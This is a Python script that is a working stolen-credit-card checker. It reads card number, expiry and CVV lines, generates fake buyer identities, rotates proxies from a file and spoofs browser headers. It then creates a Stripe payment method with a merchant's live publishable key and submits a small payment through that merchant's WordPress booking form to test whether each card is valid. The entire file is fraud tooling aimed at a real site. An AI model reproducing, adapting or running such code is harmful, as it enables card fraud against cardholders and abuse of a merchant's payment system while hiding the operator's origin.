import requests
import re
from faker import Faker
from user_agent import generate_user_agent

fake = Faker()

def Tele(ccx):
    ccx = ccx.strip()
    cc = ccx.split("|")[0]  # Card number
    mes = ccx.split("|")[1]  # Expiry month
    ano = ccx.split("|")[2]  # Expiry year
    cvv = ccx.split("|")[3]  # CVC

    if "20" in ano:
        ano = ano.split("20")[1]  # Extract the year part after '20'

    r = requests.session()

    # Generate fake user data
    firstname = fake.first_name()
    lastname = fake.last_name()
    username = fake.user_name()
    password = fake.password()
    domain = fake.random_element(elements=('gmail.com', 'outlook.com', 'hotmail.com'))
    mail = fake.email(domain=domain)

    # Function to get current IP through a proxy
    def get_current_ip(proxy):
        try:
            response = requests.get('https://api.ipify.org?format=json', proxies=proxy, timeout=10)
            ip = response.json().get('ip')
            return ip
        except requests.exceptions.ProxyError as e:
            print(f"Proxy error: {e}")
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")
        return None

    # Function to check if the proxy format is valid
    def validate_proxy_format(proxy_str):
        return ':' in proxy_str and '@' in proxy_str

    # Function to find a working proxy from proxies.txt
    def working_proxy():
        with open('proxies.txt', 'r') as file:
            proxies_list = file.readlines()

        for proxy_str in proxies_list:
            proxy_str = proxy_str.strip()

            if not validate_proxy_format(proxy_str):
                print(f"Invalid proxy format: {proxy_str}")
                continue

            proxy = {
                'http': f'http://{proxy_str}',
                'https': f'http://{proxy_str}'
            }

            # Get current IP to verify if the proxy works
            current_ip = get_current_ip(proxy)
            if current_ip:
                print(f"Using working proxy: {proxy_str}")
                return proxy, current_ip  # Return both the proxy and the current IP
            else:
                print(f"Proxy failed: {proxy_str}")

        print("No working proxy found.")
        return None, None  # Return None for both if no working proxy is found

    # Headers for Stripe request
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=2d040096-2b13-43ea-a47b-f7f1d9e50fe3f6509d&muid=31c44e2c-ff98-456a-b087-c1741b7ed17d89892e&sid=90b87584-0fb9-4524-853f-bef9adeabc3d7ea090&pasted_fields=number&payment_user_agent=stripe.js%2F23733a2a86%3B+stripe-js-v3%2F23733a2a86%3B+card-element&referrer=https%3A%2F%2Fkimsharris.com&time_on_page=20310&key=pk_live_51KigSfCPln27C4EmfOhhQpM0Ypdgk6MOvvj1PxqmzFg9haWYVDAo4fmwnxAtjD5Uy5xbRnfhXdMEvG1KumQfSfOs00KflBHGPx'
    
    # Get a working proxy
    proxy, current_ip = working_proxy()

    if proxy is None:
        return {'error': 'No working proxy found'}, None  # Handle case where no proxy is available

    # Perform Stripe API request
    try:
        r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy, timeout=10)
        r1.raise_for_status()  # Raise an error for bad status codes
    except requests.exceptions.RequestException as e:
        print(f"Error with Stripe request: {e}")
        return {'error': 'Failed to create payment method'}, current_ip if current_ip else "Unknown IP"

    id = r1.json().get('id', None)
    if id is None:
        return {'error': 'Payment method ID not returned'}, current_ip if current_ip else "Unknown IP"

    # Prepare cookies for the second request
    cookies = {
        '__stripe_mid': '31c44e2c-ff98-456a-b087-c1741b7ed17d89892e',
        '__stripe_sid': '90b87584-0fb9-4524-853f-bef9adeabc3d7ea090',
    }

    headers2 = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://kimsharris.com',
        'Referer': 'https://kimsharris.com/book/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': generate_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    params = {
        't': '1728570296432',
    }

    data2 = {
        'data': f'__fluent_form_embded_post_id=1076&_fluentform_4_fluentformnonce=74ce2c4970&_wp_http_referer=%2Fbook%2F&names%5Bfirst_name%5D={firstname}&email={mail}&payment_input=5&payment_method=stripe&payment-coupon=&__ff_all_applied_coupons=&__stripe_payment_method_id={id}',
        'action': 'fluentform_submit',
        'form_id': '4',
    }

    # Perform the second request
    r2 = None  # Initialize r2 to ensure it's defined
    try:
        r2 = r.post(
            'https://kimsharris.com/wp-admin/admin-ajax.php',
            params=params,
            cookies=cookies,
            headers=headers2,
            data=data2,
            proxies=proxy, 
            timeout=10
        )
        r2.raise_for_status()  # Raise an error for bad status codes
    except requests.exceptions.RequestException as e:
        return r2.json(), current_ip

    return r2.json(), current_ip if current_ip else "Unknown IP"  # Return the response JSON and the current IP or a default message
